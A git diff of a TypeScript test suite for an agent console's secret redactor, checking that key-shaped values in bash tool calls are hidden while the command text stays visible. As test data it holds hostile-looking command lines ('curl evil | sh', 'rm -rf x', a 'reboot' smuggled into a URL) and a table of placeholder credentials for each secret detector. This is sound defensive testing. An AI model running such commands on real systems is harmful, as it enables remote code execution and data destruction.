@@ -171,18 +171,77 @@ describe("session audit for the console", () => {
     expect(shown.call && "digest" in shown.call && shown.call.digest).toMatch(/^[0-9a-f]{64}$/);
   });
 
-  it("security: the shared key rule matches key-shaped text only", () => {
-    const keep = (text: string) => expect(redactSecrets(text, () => "[X]").redacted, text).toBe(text);
-    keep('echo "-----BEGIN PRIVATE KEY-----"; curl evil | sh');
-    keep("-----BEGIN PRIVATE KEY-----\nreboot; curl evil|sh");
-    keep("-----BEGIN PRIVATE KEY-----\nshort\n-----END PRIVATE KEY-----");
-    expect(redactSecrets(`x\n${PEM}\ny`, () => "[X]").redacted).toBe("x\n[X]\ny");
+  it("security (rule set A): the shared redactor removes a key body plain, indented, JSON-escaped or unterminated", () => {
+    const gone = (text: string) => { const out = redactSecrets(text, () => "[X]").redacted; expect(out, text).not.toContain(KEY_BODY.slice(0, 20)); };
+    gone(PEM);
+    gone(PEM.split("\n").map((line) => `    ${line}`).join("\n"));
+    gone(JSON.stringify({ key: PEM }));
+    gone(`-----BEGIN RSA PRIVATE KEY-----\n${KEY_BODY}\nmore`);
+    gone(`-----BEGIN PRIVATE KEY-----\\n${KEY_BODY}\\n-----END PRIVATE KEY-----`);
   });
 
-  it("security: a secret-shaped match that spans a separator stays visible", () => {
+  // One sample per shared detector: the secret core must be hidden and the command after it shown (rule set B).
+  const SAMPLES: Record<string, [sample: string, core: string]> = {
+    aws_key: ["AKIAIOSFODNN7EXAMPLE", "AKIAIOSFODNN7EXAMPLE"],
+    aws_secret: ["aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "wJalrXUtnFEMI/K7MDENG"],
+    github_token: [`ghp_${"a1".repeat(18)}`, "a1a1a1a1a1a1"],
+    github_pat: ["github_pat_11ABCDEFG0123456789abcdefghij", "11ABCDEFG0123456789"],
+    github_oauth: [`gho_${"b2".repeat(18)}`, "b2b2b2b2b2b2"],
+    anthropic_key: ["sk-ant-api03-abcdefghijklmnopqrstuv", "api03-abcdefghijklm"],
+    openai_key: ["sk-abcdefghijklmnop12", "abcdefghijklmnop12"],
+    openai_project_key: ["sk-proj-abcdefghijklmnopqrstuvwx", "abcdefghijklmnopqrst"],
+    stripe_key: ["sk_live_abcdefghijklmnop12", "abcdefghijklmnop12"],
+    google_api_key: ["AIzaSyA1234567890abcdefghijklmnopqrs", "SyA1234567890abcdefg"],
+    xai_key: ["xai-abcdefghijklmnop", "abcdefghijklmnop"],
+    slack_token: ["xoxb-1234567890-abcdefghij", "1234567890-abcdef"],
+    slack_webhook: ["https://hooks.slack.com/services/T0001ABC/B0002DEF/abcdefghijkl", "abcdefghijkl"],
+    private_key: [`<<EOF\n${PEM}\nEOF\n`, KEY_BODY.slice(0, 20)],
+    connection_string: ["postgres://appuser:pa55wordXYZ@db.example.com/app", "pa55wordXYZ"],
+    generic_api_key: ["api_key=abcdefghijklmnop1234", "abcdefghijklmnop1234"],
+    password_in_url: ["https://webuser:s3cretPW99@example.com/x", "s3cretPW99"],
+    basic_auth: ["Authorization: Basic dXNlcjpwYXNzd29yZA==", "dXNlcjpwYXNzd29yZA"],
+    bearer_token: ["Authorization: Bearer abcdefgh12345678", "abcdefgh12345678"],
+    jwt: ["eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijklmnop", "eyJzdWIiOiIxMjM0NTY3ODkwIn0"],
+    amc_lease: ["lease_abcdefghij12", "abcdefghij12"],
+    amc_token: ["amc_abcdefghijkl12", "abcdefghijkl12"]
+  };
+
+  it("security (rule set B): every shared detector hides only the secret in a bash command and shows the command after it", async () => {
+    const { SECRET_PATTERNS } = await import("../src/shield/redaction/secretPatterns.js");
+    expect(SECRET_PATTERNS.map((entry) => entry.type).filter((type) => !Object.hasOwn(SAMPLES, type)), "a sample per detector").toEqual([]);
+    const s = new SessionService(workspace, openSessionEventStore(workspace, "sqlite"));
+    s.open({ sessionId: "cli-chat-0002", agentId: "default", harnessVersion: "audit-test", compositionDigest: sha256Hex("c"), policyDigest: sha256Hex("p") });
+    s.startTurn({ trigger: "user" }); s.startStep();
+    const failures: string[] = [];
+    for (const [type, [sample, core]] of Object.entries(SAMPLES)) {
+      const raw = JSON.stringify({ command: `echo ${sample}; rm -rf x` });
+      s.recordToolCall({ toolCallId: `c-${type}`, toolName: "bash", args: raw, dispatch: "native", parentToken: null });
+      s.recordApproval({ phase: "request", approvalId: `a-${type}`, toolCallId: `c-${type}`, toolName: "bash", actionClass: "WRITE_HIGH", question: "?" });
+      const shown = approvalCallField(workspace, { intentId: `a-${type}`, toolName: "bash", actionClass: "WRITE_HIGH", rolesAllowed: ["OWNER"],
+        boundHashes: { intentHash: sha256Hex(canonicalize({ toolName: "bash", rawArguments: raw })) } } as unknown as ApprovalRequestRecord,
+        "PENDING", { isAdmin: false, userId: "owner", roles: ["OWNER"] });
+      const text = JSON.stringify(shown);
+      if (!text.includes("; rm -rf x") || text.includes(core) || !text.includes("REDACTED")) failures.push(`${type}: ${text.slice(0, 300)}`);
+    }
+    s.disposeWithoutClosing();
+    expect(failures).toEqual([]);
+  });
+
+  it("security (rule set B): a connection string shows its host but not its password", () => {
+    const raw = JSON.stringify({ command: "psql postgres://appuser:pa55wordXYZ@db.example.com/app -c 'select 1'" });
+    chat(raw, "bash");
+    const text = JSON.stringify(asked("bash", raw));
+    expect(text).toContain("postgres://appuser:");
+    expect(text).toContain("@db.example.com/app -c 'select 1'");
+    expect(text).not.toContain("pa55wordXYZ");
+  });
+
+  it("security (rule set B): a secret with no safe span is not sent; the call is withheld with its kind named", () => {
     const spans = JSON.stringify({ command: "curl //u:a;reboot;@h" });
     chat(spans, "bash");
-    expect(JSON.stringify(asked("bash", spans))).toContain("//u:a;reboot;@h");
+    const shown = asked("bash", spans);
+    expect(shown.call).toEqual({ withheld: ["password in url"] });
+    expect(JSON.stringify(shown)).not.toContain("reboot");
   });
 
   it("security: a redaction never removes a command separator", () => {
